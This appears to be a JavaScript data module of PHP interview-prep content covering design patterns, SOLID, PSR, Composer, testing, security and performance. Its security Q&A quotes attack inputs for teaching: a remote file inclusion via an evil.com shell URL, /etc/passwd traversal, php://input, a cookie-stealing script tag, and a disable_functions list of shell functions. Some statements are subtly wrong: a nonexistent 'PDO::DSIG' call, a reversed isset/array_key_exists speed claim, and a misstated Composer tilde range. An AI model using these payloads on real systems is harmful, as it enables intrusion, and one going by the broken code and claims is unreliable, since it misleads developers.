      'Design patterns are proven solutions to recurring software design problems. In PHP, the most commonly needed patterns are: Singleton (dangerous — prefer dependency injection), Factory/Abstract Factory (create objects without coupling to concrete classes), Strategy (swap algorithms at runtime), Observer (event-driven decoupling), Repository (abstract data access), Decorator (add behavior without subclassing), and Command (encapsulate operations as objects for queuing/undo). PHP frameworks implement many of these: Laravel\'s service container is a Factory+DI; Eloquent Observers implement Observer; middleware is a Chain of Responsibility.',
    realWorldExample:
      'Laravel\'s notification system uses Strategy + Observer: a `Notification` object defines the content once. The sending strategy is injected: `$user->notify(new InvoiceGenerated($invoice))`. The `User` model has `Notifiable` trait; the notification inspects `$user->routeNotificationFor("mail")` and `routeNotificationFor("slack")` to deliver via multiple channels without the notification knowing the delivery mechanism.',
    practicalUseCase:
      'Implement the Strategy pattern for payment processing: define `interface PaymentStrategy { public function charge(int $amountCents): Receipt; }`. Implement `StripeStrategy`, `PayPalStrategy`, `BankTransferStrategy`. Create a `PaymentService` that accepts the strategy in its constructor. Now you can swap payment providers without changing `PaymentService`. Unit test each strategy independently. This is the pattern at the heart of most e-commerce PHP applications.',
    keyPoints: [
      'Repository pattern decouples business logic from data access: `UserRepository::findActiveByEmail()` hides whether data comes from MySQL, Redis, or an API.',
      'Strategy vs Template Method: Strategy injects different behavior as an object; Template Method uses inheritance and hook methods.',
      'Decorator wraps an object: `LoggingRepository extends Repository` wraps `MySQLRepository` to log every query — open/closed principle.',
      'Singleton is almost always wrong in PHP web apps — use Laravel\'s service container `bind()` or `singleton()` instead.',
      'Observer in PHP: `SplSubject`/`SplObserver` interfaces or Laravel\'s `Event`/`Listener` — decouples the trigger from the reaction.',
      'Factory Method: `PaymentGatewayFactory::create(config("payment.provider"))` — the caller doesn\'t know which concrete class it gets.',
      'Command pattern fits PHP jobs/queues perfectly: `class SendWelcomeEmail implements ShouldQueue { public function handle() {...} }`.',
    ],
    interviewQA: [
      {
        question: 'What is the Repository pattern and why is it used in PHP applications?',
        answer:
          'The Repository pattern places an abstraction layer between your business logic (services, controllers) and your data access code (SQL queries, ORM calls). The interface defines what operations are available (`findById`, `save`, `delete`, `findActiveByEmail`) without specifying HOW. The concrete implementation does the actual query. Benefits: (1) Unit test business logic with a fake/in-memory repository — no DB required. (2) Swap MySQL for PostgreSQL without touching business logic. (3) Add caching in a `CachingUserRepository` that wraps `MySQLUserRepository` (decorator). Downside: adds a layer of abstraction that can be overkill for simple CRUD apps — don\'t add it until you have a clear reason.',
        follow_up: 'If you\'re using Eloquent ORM in Laravel, do you still need the Repository pattern?',
      },
      {
        question: 'How does the Decorator pattern differ from inheritance for extending behavior?',
        answer:
          'Inheritance adds behavior at compile time by subclassing — you must decide the exact behavior when writing the class. Decorator adds behavior at runtime by wrapping an object that implements the same interface. Example: `LoggingRepository` wraps `MySQLRepository` — both implement `RepositoryInterface`. You can compose decorators: `new CachingRepository(new LoggingRepository(new MySQLRepository()))` — logging + caching + DB. With inheritance, combining these three behaviors would require a separate subclass for each combination. Decorators follow the Open/Closed Principle: add behavior by wrapping, not by modifying the original class.',
        follow_up: 'When does the decorator pattern become a problem, and what design pitfall does it introduce?',
      },
    ],
  },

  'SOLID Principles in PHP': {
    explanation:
      'SOLID is five object-oriented design principles that guide maintainable code. Single Responsibility: a class has one reason to change — a `UserService` that handles registration AND sends emails AND generates PDFs has three. Open/Closed: open for extension, closed for modification — add new behavior by adding new classes, not editing existing ones. Liskov Substitution: subclasses must be substitutable for their parent without breaking the program. Interface Segregation: many small specific interfaces beat one large general one. Dependency Inversion: depend on abstractions (interfaces), not concrete implementations.',
    realWorldExample:
      'A Laravel `OrderService` violates SRP: it handles order creation, payment charging, email notification, and PDF invoice generation in one class. Applying SRP: extract to `PaymentService`, `NotificationService`, `InvoiceService`. The `OrderService` orchestrates them. Now each service has one reason to change — swapping email providers only touches `NotificationService`. Adding a new payment provider only touches `PaymentService`. Each is independently testable.',
    practicalUseCase:
      'Refactor a `UserController` that queries the DB, sends email, and formats the response all in one method. Apply SRP: move DB logic to `UserRepository`, email to `Mailer`, formatting to `UserResource`. Apply DIP: inject `UserRepositoryInterface` (not the concrete MySQL class) into the controller. Now swap the repository with a fake in tests — no DB connection needed. This exercise makes SOLID concrete rather than theoretical.',
    keyPoints: [
      'SRP: each class/function has ONE reason to change — if you say "and" when describing what it does, it\'s doing too much.',
      'OCP: extend via new classes, not by editing existing production code — reduces the risk of regressions.',
      'LSP: a `Square extends Rectangle` that overrides `setWidth()` to also change height violates LSP — substituting it for Rectangle breaks callers that set width independently.',
      'ISP: don\'t force classes to implement methods they don\'t use — split `UserInterface { save(), delete(), sendEmail(), generatePdf() }` into focused interfaces.',
      'DIP: high-level modules (controllers) depend on interfaces; low-level modules (MySQL repositories) implement those interfaces.',
      'SOLID isn\'t always appropriate — don\'t apply it to simple scripts or one-off code; the overhead of abstractions must be justified by actual need for flexibility.',
      'PHP traits can violate SRP when they add unrelated behaviors — scrutinize what traits bring into a class.',
    ],
    interviewQA: [
      {
        question: 'Can you give a real PHP example of the Open/Closed Principle?',
        answer:
          'A discount calculator with a switch on discount type is closed for extension: every new discount type requires editing the existing class. Applying OCP: define `interface DiscountStrategy { public function apply(float $price): float; }`. Implement `PercentageDiscount`, `FixedAmountDiscount`, `BuyOneGetOneDiscount`. The `Order` class accepts a `DiscountStrategy` in its constructor and applies it — adding a new discount type means adding a new class, not modifying `Order`. The `Order` class is closed for modification, open for extension via the strategy interface.',
        follow_up: 'How does PHP\'s attribute system (PHP 8.0) enable OCP-friendly configuration without modifying core classes?',
      },
      {
        question: 'What is the Liskov Substitution Principle and what\'s a common PHP violation?',
        answer:
          'LSP: anywhere you use a parent class, you must be able to substitute a subclass without the program breaking. Common violation: `class ReadOnlyRepository extends UserRepository` overrides `save()` to throw `UnsupportedOperationException`. Code that accepts `UserRepository` and calls `save()` will crash when given a `ReadOnlyRepository` — the substitution broke the contract. Fix: don\'t inherit from `UserRepository`. Instead, both implement `ReadableRepositoryInterface`. The read-only variant only implements the reading interface, not the writing one. LSP violations often signal that inheritance was the wrong relationship — composition or interface segregation would be cleaner.',
        follow_up: 'How does PHP\'s type system help enforce LSP at compile time?',
      },
    ],
  },

  'Namespaces and PSR Standards': {
    explanation:
      'PHP namespaces (`namespace App\\Services`) prevent class name collisions in large codebases and enable autoloading. Without namespaces, every class must have a globally unique name like `App_Service_UserService_v2`. PSR (PHP Standards Recommendations) from the PHP-FIG standardize cross-project conventions: PSR-1/2/12 define coding style, PSR-4 defines autoloading (class `App\\Services\\UserService` maps to file `src/Services/UserService.php`), PSR-7 standardizes HTTP message interfaces, PSR-11 standardizes dependency injection containers, PSR-3 standardizes loggers.',
    realWorldExample:
      'Composer\'s autoloader implements PSR-4. In `composer.json`: `"autoload": {"psr-4": {"App\\\\": "src/"}}`. Running `composer dump-autoload` generates `vendor/autoload.php`. Now `new App\\Services\\UserService()` automatically loads `src/Services/UserService.php` — no `require` statements needed anywhere. Laravel, Symfony, and every modern PHP project use this. The `use` statement at the top of files creates aliases: `use App\\Services\\UserService` lets you write `new UserService()` instead of `new App\\Services\\UserService()`.',
    practicalUseCase:
      'Create a small PHP project from scratch: `composer init`, add a `src/` directory, configure PSR-4 autoloading in `composer.json`, run `composer dump-autoload`. Create `src/Models/User.php` with `namespace App\\Models; class User {}`. In `index.php`, `require "vendor/autoload.php"` and `use App\\Models\\User; $u = new User();`. No manual requires. This is the foundation of every Composer-based PHP project.',
    keyPoints: [
      'PSR-4 maps namespace root to directory: `App\\` → `src/` means `App\\Http\\Controllers\\UserController` → `src/Http/Controllers/UserController.php`.',
      '`use` imports a namespace into the current file scope; it doesn\'t load the class — Composer\'s autoloader does that on first instantiation.',
      'Namespace aliases: `use Very\\Long\\Namespace\\ClassName as ShortName` — the alias only applies to the current file.',
      'Global namespace: `\\Exception` explicitly references the global `Exception` class inside a namespaced file — without `\\`, PHP looks for `App\\Services\\Exception` first.',
      'PSR-12 supersedes PSR-2: 4-space indent, braces on same line for methods, `declare(strict_types=1)` after opening `<?php`.',
      'PSR-7 HTTP messages (Request/Response as value objects) enable middleware systems like Laravel\'s pipeline and Slim\'s middleware stack.',
      '`composer validate` checks `composer.json` syntax and best practices — run it in CI before deploying.',
    ],
    interviewQA: [
      {
        question: 'What is PSR-4 autoloading and how does it map class names to file paths?',
        answer:
          'PSR-4 defines a convention: a namespace prefix maps to a base directory. Given `"App\\\\": "src/"` in `composer.json`, the class `App\\Http\\Controllers\\UserController` maps to the file `src/Http/Controllers/UserController.php`. The algorithm: take the fully-qualified class name, strip the namespace prefix (`App\\`), replace remaining `\\` with `/`, append `.php`. Composer generates a class map or directory-based lookup from this. The key benefit: no `require` statements anywhere in application code. Rename a file → update the namespace → autoloader finds it automatically. This is how every Laravel, Symfony, and WordPress plugin built with Composer works.',
        follow_up: 'What is the difference between PSR-4 and classmap autoloading in Composer, and when would you use classmap?',
      },
      {
        question: 'What PHP-FIG PSR standards should every PHP developer know?',
        answer:
          'PSR-1 (basic coding standard: `<?php` no closing tag, UTF-8, StudlyCaps for classes), PSR-12 (extended coding style: indentation, braces, declare), PSR-4 (autoloading: namespace to directory mapping), PSR-3 (logger interface: `Psr\\Log\\LoggerInterface` with `debug/info/notice/warning/error/critical/alert/emergency` methods), PSR-7 (HTTP messages: immutable Request/Response value objects), PSR-11 (container interface: `has($id)`, `get($id)`), PSR-15 (HTTP server middleware: `process(Request, Handler): Response`). PSR-3, 7, 11, 15 are the runtime standards that frameworks implement — write to these interfaces and your code works with any compliant framework.',
        follow_up: 'Why does PSR-7 make HTTP message objects immutable, and what problem does that solve?',
      },
    ],
  },

  'Composer and Dependency Management': {
    explanation:
      'Composer is PHP\'s dependency manager: `composer.json` declares what your project needs, `composer.lock` records the exact version of every package that was installed. Running `composer install` in production installs exactly what\'s in `composer.lock` — reproducible builds. `composer update` fetches the latest versions within your version constraints and rewrites `composer.lock`. The `vendor/` directory contains all installed packages; never commit it to git (add to `.gitignore`). `composer dump-autoload -o` regenerates the optimized class map for production.',
    realWorldExample:
      'A Laravel project declares `"laravel/framework": "^10.0"` in `composer.json`. `^10.0` allows any 10.x.x release but not 11.0. `composer.lock` pins it to exactly `10.48.7`. CI and production both run `composer install` — they get `10.48.7`. A developer runs `composer update laravel/framework` locally, gets `10.48.9`, and commits the updated `composer.lock`. CI and production now get `10.48.9` on next deploy. Without `composer.lock`, CI might get a different version than the developer tested.',
    practicalUseCase:
      'Create a new project: `composer init`, add `"vlucas/phpdotenv": "^5.0"` as a dependency and `"phpunit/phpunit": "^10.0"` as a dev dependency (`require-dev`). Run `composer install`. In CI, use `composer install --no-dev` to skip dev dependencies. Run `composer audit` to check for known security vulnerabilities in your dependencies. Use `composer why-not php/8.4` to find which package blocks a PHP upgrade.',
    keyPoints: [
      'Always commit `composer.lock` — it guarantees every environment runs exactly the same package versions.',
      '`require` vs `require-dev`: dev dependencies (PHPUnit, Faker) are not installed in production with `--no-dev` flag.',
      'Version constraints: `^1.2.3` = `>=1.2.3 <2.0.0`; `~1.2` = `>=1.2.0 <1.3.0`; `*` = any version (dangerous).',
      '`composer scripts` in `composer.json` define shortcuts: `"test": "phpunit"` → run with `composer test`.',
      '`composer audit` checks your installed packages against known security vulnerabilities in the Packagist security advisory database.',
      '`composer outdated` lists all packages with newer available versions — use it for regular dependency maintenance.',
      'Private packages: use a Satis server or VCS repository in `repositories` section to include internal packages.',
    ],
    interviewQA: [
      {
        question: 'What is the difference between `composer install` and `composer update`?',
        answer:
          '`composer install` reads `composer.lock` and installs EXACTLY those versions — no version resolution happens. This is what you run in CI/CD and production for reproducible builds. `composer update` re-reads `composer.json`, resolves the latest compatible versions within your constraints, installs them, and REWRITES `composer.lock`. Always run `composer update` locally or in a dev branch, review the `composer.lock` diff, test, and commit the updated lockfile. Running `composer update` in production is dangerous — you get untested package versions.',
        use_case: 'A new developer clones your repo and runs `composer install` — they get the exact versions tested by the CI system. If they ran `composer update`, they might get newer versions with breaking changes that nobody has tested yet.',
        follow_up: 'What does `composer install --prefer-dist --optimize-autoloader` do, and why is it used in production deployments?',
      },
      {
        question: 'How do semantic versioning constraints work in `composer.json`?',
        answer:
          'Semantic versioning (semver): `MAJOR.MINOR.PATCH`. MAJOR: breaking change. MINOR: backward-compatible new feature. PATCH: bug fix. Composer constraint syntax: `"^1.2.3"` = `>=1.2.3 <2.0.0` (allows minor and patch upgrades, not major). `"~1.2"` = `>=1.2.0 <1.3.0` (tighter, only patch). `"1.2.*"` = `>=1.2.0 <1.3.0`. `">=1.2 <2.0"` explicit range. The caret `^` is the standard recommendation: you get security patches and new features automatically, but no breaking changes. For packages that don\'t follow semver properly, use `~` or pin to an exact version.',
        follow_up: 'How would you handle a package that claims semver compliance but keeps making breaking changes in minor versions?',
      },
    ],
  },

  'Testing PHP Applications': {
    explanation:
      'PHP testing uses PHPUnit as the standard framework for unit and integration tests. Unit tests isolate a single class by mocking its dependencies — no real database, no real HTTP requests. Integration tests wire multiple classes together, often with a real test database. Feature/E2E tests hit actual HTTP endpoints. PHPUnit uses `TestCase` base class, `setUp()`/`tearDown()` lifecycle, `assertEquals`/`assertSame`/`assertCount` assertions. Pest is a newer testing framework with a more expressive, functional syntax that compiles to PHPUnit under the hood.',
    realWorldExample:
      'Testing a `UserService::register()` method: the service depends on `UserRepository` and `Mailer`. In a unit test, create mocks: `$repo = $this->createMock(UserRepositoryInterface::class); $repo->expects($this->once())->method("save")->with($this->isInstanceOf(User::class))`. `$mailer = $this->createMock(MailerInterface::class); $mailer->expects($this->once())->method("sendWelcomeEmail")`. Inject both mocks into `UserService` and call `register()`. Assertions verify that `save()` and `sendWelcomeEmail()` were called exactly once with the right arguments — no DB, no SMTP.',
    practicalUseCase:
      'Write a PHPUnit test for a `PriceCalculator::applyDiscount(float $price, float $percent): float` function. Cover: normal case (100 * 20% = 80), zero price, 100% discount (result = 0), negative percent (should throw `InvalidArgumentException`), and over-100% discount. Run with `./vendor/bin/phpunit --coverage-html coverage/`. Aim for 100% branch coverage on this one class — `--coverage-html` shows which branches were and weren\'t hit.',
    keyPoints: [
      'Unit tests should have NO external dependencies — no DB, no filesystem, no HTTP. Mock everything the class depends on.',
      '`$this->createMock(Interface::class)` returns a PHPUnit mock that defaults to returning null for all methods — use `expects()` to assert calls.',
      'Test doubles: dummy (placeholder, never called), stub (returns canned data), mock (asserts it was called correctly), fake (working lightweight implementation), spy (records calls for later assertion).',
      'Test naming: `testGivenInvalidEmail_WhenRegister_ThenThrowsValidationException` — verbose but self-documenting.',
      'Fixtures: `@dataProvider` in PHPUnit or `dataset()` in Pest — run the same test with multiple input sets.',
      'Database tests: use SQLite in-memory (`PDO::DSIG("sqlite::memory:")`) or Laravel\'s `RefreshDatabase` trait to roll back after each test.',
      'Code coverage: 80% line coverage is a common target, but branch coverage (covering both if/else paths) is more valuable.',
    ],
    interviewQA: [
      {
        question: 'What is the difference between a mock and a stub in PHPUnit?',
        answer:
          'A stub controls indirect inputs to the system under test — it returns pre-configured responses when called. A mock also controls indirect inputs but additionally asserts that specific methods were called in a specific way. Stubs are for "given this dependency returns X, does my class do the right thing?" Mocks are for "did my class call this dependency with the right arguments?" In PHPUnit, `createStub()` creates a stub (no call assertions), `createMock()` creates a mock object where you can add expectations with `expects()`. The practical difference: a test with only stubs won\'t fail if the system under test never calls the dependency; a test with mocks fails if the expected call doesn\'t happen.',
        follow_up: 'When would you use a fake (hand-written test double) instead of a PHPUnit mock?',
      },
      {
        question: 'How do you test code that has side effects like sending emails or writing to files?',
        answer:
          'Strategy 1: Dependency injection + mocking — inject a `MailerInterface`, mock it in tests, assert `sendEmail()` was called with correct args. No real email is sent. Strategy 2: Fakes — write an `InMemoryMailer` that captures emails to an array: `$mailer->getSentEmails()` returns what was sent. Better for testing email CONTENT, not just that sending was called. Strategy 3: Laravel/framework test helpers — `Mail::fake()` intercepts all mail and provides `Mail::assertSent(WelcomeMailable::class, fn($mail) => $mail->hasTo("user@example.com"))`. For filesystem: inject a `FilesystemInterface`, use an in-memory implementation in tests. Never depend on real global state in tests — it makes them fragile and order-dependent.',
        follow_up: 'How do you ensure that tests run in isolation when they share a database?',
      },
    ],
  },

  'Security Best Practices': {
    explanation:
      'PHP application security covers several categories: input validation (reject bad data early), output encoding (prevent XSS by escaping before output), SQL injection prevention (prepared statements), authentication security (bcrypt, session fixation prevention), file upload safety (MIME validation, outside webroot storage), CSRF protection (token per form), and dependency security (composer audit). The OWASP Top 10 lists the most critical web vulnerabilities — PHP applications are historically vulnerable to Injection, Broken Access Control, and Security Misconfiguration.',
    realWorldExample:
      'A code review catches three vulnerabilities in one controller action: `echo $_GET["message"]` (XSS — should be `htmlspecialchars()`), `"SELECT * FROM users WHERE id = " . $_GET["id"]` (SQL injection — should use prepared statement), and `include($_GET["page"] . ".php")` (LFI — local file inclusion that can expose `/etc/passwd` or execute arbitrary PHP files). All three read from `$_GET` and trust it without validation — the root cause is missing the "never trust user input" principle.',
    practicalUseCase:
      'Audit a simple PHP app for security: run `composer audit` for vulnerable dependencies, add `declare(strict_types=1)` to all files, search for any `echo $_`, `include $_`, or raw SQL string concatenation, check that all forms have CSRF tokens, verify that all file uploads are checked with `finfo_file()` not `mime_type`, and confirm session cookies are set with `httponly` and `secure` flags. Document each finding with CWE number and recommended fix.',
    keyPoints: [
      'Never echo unescaped user input — use `htmlspecialchars($val, ENT_QUOTES, "UTF-8")` for all HTML output.',
      'SQL injection: ALWAYS use prepared statements with bound parameters — even for integer IDs.',
      'Password storage: `password_hash($plain, PASSWORD_ARGON2ID)` and `password_verify($input, $hash)` — never md5, sha1, or base64.',
      'CSRF: every state-changing form needs a `bin2hex(random_bytes(32))` token stored in session and verified on submit.',
      'File uploads: validate MIME with `finfo_file()`, generate new filename with `bin2hex(random_bytes(16))`, store outside webroot.',
      '`disable_functions = exec,shell_exec,system,passthru,popen` in php.ini on shared or multi-tenant servers.',
      'Security headers: set `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy` via PHP `header()` calls.',
    ],
    interviewQA: [
      {
        question: 'What is XSS and how does PHP prevent it?',
        answer:
          'Cross-Site Scripting (XSS) injects malicious scripts into web pages viewed by other users. In PHP, XSS happens when user-controlled data is echoed directly into HTML without escaping: `echo $_POST["comment"]` — if the comment contains `<script>document.cookie</script>`, the browser executes it. Prevention: `echo htmlspecialchars($_POST["comment"], ENT_QUOTES, "UTF-8")` converts `<`, `>`, `"`, `\'`, `&` to HTML entities. For rich text (allowing some HTML), use a server-side sanitizer like HTML Purifier or the DOMDocument API — never trust client-side sanitization alone. Content-Security-Policy header blocks inline scripts as an additional defense layer.',
        use_case: 'A stored XSS in a comment field on a banking site lets an attacker steal session cookies of every user who views the page — one injection affects all visitors.',
        follow_up: 'What is the difference between reflected XSS and stored XSS, and which is harder to detect?',
      },
      {
        question: 'How does a Local File Inclusion (LFI) vulnerability work in PHP?',
        answer:
          'LFI occurs when user input controls the path passed to `include`, `require`, `file_get_contents`, or similar functions: `include($_GET["page"] . ".php")`. An attacker passes `page=../../../../etc/passwd` (with path traversal) or `page=php://input` (to include raw POST body as code) or on older PHP `page=http://evil.com/shell.php` (Remote File Inclusion). Fixes: (1) Never include files based on user input. (2) Use a whitelist: `$allowed = ["home", "about", "contact"]; if (!in_array($_GET["page"], $allowed)) die("Invalid page")`. (3) Use `realpath()` and verify the path starts with your expected base directory.',
        follow_up: 'Can LFI lead to Remote Code Execution, and what PHP configuration option mitigates it partially?',
      },
    ],
  },

  'Performance and Caching': {
    explanation:
      'PHP performance optimization addresses CPU, memory, and I/O bottlenecks. The highest-ROI changes: enable OPcache (eliminates repeated PHP parsing), profile with Xdebug or Blackfire to find the actual bottleneck (not guessing), cache expensive operations in Redis/Memcached, use database query optimization (EXPLAIN, indexes), and minimize N+1 queries (eager load relationships). PHP has no shared memory between requests by default — use Redis for shared caching, APCu for single-server caching, and FPM process management to control concurrency.',
    realWorldExample:
      'A Laravel API endpoint that loads a user\'s dashboard takes 800ms. Blackfire profiler shows 73% of time in database queries — 1 query for the user + 50 queries for their orders\' product names (N+1). Fix: `User::with(["orders.products"])->find($id)` eager-loads in 2 queries (99% reduction). After adding `Cache::remember("dashboard:{$userId}", 300, fn() => ...)`, cached responses return in 15ms. The N+1 fix is free; the cache just multiplies the effect.',
    practicalUseCase:
      'Profile a PHP script with Blackfire or `microtime(true)` before/after blocks. Add APCu caching for a computed value: `$result = apcu_fetch("expensive_key") ?: tap(computeExpensiveValue(), fn($v) => apcu_store("expensive_key", $v, 300))`. Then implement HTTP cache headers: `header("Cache-Control: public, max-age=3600")` for public content, `header("ETag: " . md5($content))` for conditional requests. Measure with `ab -n 1000 -c 50 localhost/endpoint`.',
    keyPoints: [
      'OPcache is the single most impactful PHP performance setting — enable it with `opcache.enable=1` and `opcache.jit_buffer_size=100M`.',
      'Xdebug profiling generates cachegrind files for KCachegrind/Webgrind; Blackfire is the professional alternative for production profiling.',
      'APCu caches data in shared memory on a single server; Redis or Memcached cache across multiple servers.',
      'N+1 problem: loading 100 posts then querying each post\'s author separately = 101 queries. Eager loading: 2 queries total.',
      '`array_key_exists()` is ~1.5× faster than `isset()` for checking if a key exists in a pre-existing array (isset short-circuits on null).',
      'String concatenation with `.=` in a tight loop is O(n²) — use `implode()` or `ob_start()`/`ob_get_clean()` for building large strings.',
      'PHP-FPM `pm.max_children` = (available_RAM − OS_overhead) / avg_per_process_RAM — calculate, don\'t guess.',
    ],
    interviewQA: [
      {
        question: 'What is the N+1 query problem and how do you solve it in PHP?',
        answer:
          'N+1 occurs when you load N records and then execute 1 additional query per record: `foreach ($posts as $post) { echo $post->author->name; }` — if `$post->author` lazy-loads via ORM, this runs 1 query for posts + N queries for each author = N+1 total. For 100 posts, that\'s 101 database queries. Solution: eager loading — fetch all related data in one or two queries upfront. In Laravel/Eloquent: `Post::with("author")->get()` runs 2 queries: all posts, then all authors for those posts in one IN clause. In raw PDO: a JOIN: `SELECT posts.*, users.name FROM posts JOIN users ON posts.user_id = users.id`.',
        use_case: 'An API endpoint for 50 orders each needing product name + category: without eager loading = 101 queries in 1.5s. With eager loading: 3 queries in 35ms.',
        follow_up: 'How would you detect N+1 queries automatically in a development environment?',
      },
      {
        question: 'How do you implement cache invalidation in a PHP application?',
        answer:
          'Cache invalidation is famously one of the two hard problems in computer science. Strategies: (1) TTL-based expiration: cache with a timeout, accept stale data until it expires — simple but stale. (2) Write-through: update the cache whenever you update the DB — cache is always fresh, but cache is duplicated. (3) Cache-aside: on write, delete the cache key; next read misses and rehydrates from DB. (4) Event-driven: listen to model events — on `User::updated()`, delete `Cache::forget("user:{$id}")`. For complex invalidation: use cache tags (Redis + Laravel Cache tags), tag all related cache entries, and flush by tag when the underlying data changes.',
        follow_up: 'What is the cache stampede problem and how do you prevent it in PHP with Redis?',
      },
    ],
  },

  'PHP Interview Problem Solving': {
    explanation:
      'PHP interview problem solving tests both algorithmic thinking and PHP-idiomatic solutions. Common patterns: string manipulation (multibyte-safe with `mb_*` functions), array processing (`array_reduce`, `usort`, `array_unique`), recursion with memoization, data structure implementations (stack, queue, linked list), and algorithm analysis (Big-O). PHP-specific traps in interviews: type juggling in comparisons, pass-by-value vs reference for arrays, integer overflow (PHP uses 64-bit int on 64-bit systems), and the difference between `==` and `===` in sorting comparisons.',
    realWorldExample:
      'Interview question: "Find duplicate emails in a large CSV without loading the entire file into memory." PHP solution: stream the CSV with `fgetcsv()`, maintain a `$seen = []` hash set (array key = email → O(1) lookup), and `$duplicates = []` for results. Memory usage stays constant at O(unique emails in memory) regardless of file size — a 10GB CSV file is handled the same as a 10MB one. Explaining this tradeoff (memory efficiency vs speed) is the mark of a senior PHP developer.',
    practicalUseCase:
      'Solve FizzBuzz, then reverse a string without using `strrev()`, then find the longest non-repeating substring in O(n) with a sliding window. For each, write idiomatic PHP: typed parameters, early returns, and no unnecessary variables. Then explain the Big-O of your solution and an alternative approach. This is a typical 45-minute PHP senior interview technical section.',
    keyPoints: [
      'PHP integers are 64-bit on 64-bit platforms — `PHP_INT_MAX` is 9223372036854775807; use `gmp_*` or `bcmath` for bigger numbers.',
      'String reversal in PHP: `strrev()` is byte-reversal — use `implode(array_reverse(mb_str_split($s)))` for Unicode-safe reversal.',
      'PHP arrays as hash maps give O(1) average-case lookup — `isset($seen[$key])` is O(1), same as a Python dict or Go map.',
      'Generators (`yield`) process sequences lazily — `range(1, 1000000)` as a generator uses O(1) memory vs O(n) for a full array.',
      'Recursion in PHP has a default `memory_limit` and no tail-call optimization — prefer iterative solutions for deep recursion.',
      '`SplStack`, `SplQueue`, `SplMinHeap` are available in PHP\'s SPL — use them for interview problems requiring explicit data structures.',
      'Sorting stability: PHP\'s `sort()` is stable since PHP 8.0 — elements with equal keys maintain their original order.',
    ],
    interviewQA: [
      {
        question: 'Write a PHP function to check if a string is a palindrome, then make it Unicode-safe.',
        answer:
          'Basic version: `function isPalindrome(string $s): bool { $clean = strtolower(preg_replace("/[^a-zA-Z0-9]/", "", $s)); return $clean === strrev($clean); }`. Problem: `strrev()` reverses bytes, not Unicode characters. Unicode-safe: `function isPalindromeUnicode(string $s): bool { $s = mb_strtolower(preg_replace("/[^\\p{L}\\p{N}]/u", "", $s)); $chars = mb_str_split($s); return $chars === array_reverse($chars); }`. The `\\p{L}` regex matches any Unicode letter, `\\p{N}` any Unicode digit, and `mb_str_split()` splits into Unicode code points rather than bytes. The `array_reverse` approach is O(n) time and O(n) space.',
        follow_up: 'How would you solve this in O(1) space without creating intermediate arrays?',
      },
      {
        question: 'What is a PHP generator and when would you use one over a regular array?',
        answer:
          'A generator is a function that uses `yield` to return values one at a time, pausing between yields. The key difference from returning an array: generators are lazy — they only compute/load the next value when requested, using O(1) memory regardless of sequence size. Use generators when: (1) The sequence is too large to fit in memory (processing a 10M-row DB result set). (2) Values are expensive to compute and you might not need all of them (early termination). (3) You need to represent an infinite sequence (`function fibonacci(): Generator`). The downside: generators can only be iterated once (they\'re not rewindable), and debugging generator state is harder than array state.',
        follow_up: 'How do you send data INTO a generator (not just receive from it), and what real-world use case would that serve?',
      },
    ],
  },
};

export default php;
